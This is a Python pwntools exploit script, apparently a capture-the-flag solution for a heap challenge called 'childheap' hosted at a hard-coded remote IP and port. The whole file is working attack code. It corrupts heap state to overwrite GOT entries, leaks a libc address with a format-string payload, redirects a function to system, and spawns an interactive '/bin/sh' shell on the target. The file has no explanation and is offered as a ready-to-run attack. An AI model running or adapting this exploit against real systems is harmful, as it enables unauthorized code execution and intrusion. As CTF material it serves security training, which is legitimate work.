from pwn import *

r = remote("13.124.131.103", 31337)
#r = process("./childheap")

def allocate(size, data):
	r.send("1\n")
	print r.recvuntil("Input size: ")
	r.send(str(size)+"\n")
	print r.recvuntil("Input data: ")
	r.send(data)
	print r.recvuntil("> ")

def free():
	r.send("2\n")
	print r.recvuntil("> ")

def secret(code):
	r.send(str(0x31337) + "\n")
	print r.recvuntil("code: ")
	r.send(str(code) + "\n")
	print r.recvuntil("> ")

raw_input("$")
print r.recvuntil("> ")

r.send("1234\n")

allocate(4095, "asdf")
free()

r.send("3\n")
print r.recvuntil("(y/n)? ")
r.send("n\n")
print r.recvuntil("new name: ")
r.send("asdf\n")
print r.recvuntil("new one (y/n)? ")
r.send("y\n")

print r.recvuntil("> ")

free()

r.send("3\n")
print r.recvuntil("(y/n)? ")
r.send("n\n")
print r.recvuntil("name: ")
r.send("a"*8 + p64(0x6020b0) + "\n")
print r.recvuntil("new one (y/n)? ")
r.send("y\n")

print r.recvuntil("> ")

allocate(4095, "asdf")

r.send("3\n")
print r.recvuntil("(y/n)? ")
r.send("n\n")
print r.recvuntil("name: ")
r.send("\x00"*8 + p64(0x6020a8)*2 + "\n")
print r.recvuntil("new one (y/n)? ")
r.send("y\n")

free()
secret(1041)

allocate(1023, "\x00"*8 + p64(0x602060-2))

r.send("3\n")
print r.recvuntil("(y/n)? ")
r.send("n\n")
print r.recvuntil("name: ")

payload = p64(0x4007c6)
payload += p64(0x400756)
payload += p64(0x4007e6)

r.send(payload + "\n")

print r.recvuntil("new one (y/n)? ")
r.send("y\n")

print r.recvuntil("> ")

r.send("%7$s.aaa" + p64(0x602038))

recved = r.recv(6)

read_libc = u64(recved + "\x00\x00")
#libc_base = read_libc - 0xf7220
#system = libc_base  + 0x45390
libc_base = read_libc - 0xf69a0
system = libc_base + 0x45380

print "read_libc: "  +hex(read_libc)

r.send("aa\n") # modify
print r.recvuntil("(y/n)? ")
r.send("n\n")
print r.recvuntil("name: ")
print r.recvuntil("new one (y/n)? ")
r.send("n\n")
print r.recvuntil("> ")

r.send("aa\n")
print r.recvuntil("(y/n)? ")
r.send("n\n")
print r.recvuntil("name: ")

payload = "A"*2
payload += p64(0x4007c6)
payload += p64(system)
payload += p64(0x4007e6)

r.send(payload + "\n")
print r.recvuntil("new one (y/n)? ")
r.send("y\n")

print r.recvuntil("> ")

r.send("/bin/sh\x00\n")
r.interactive()
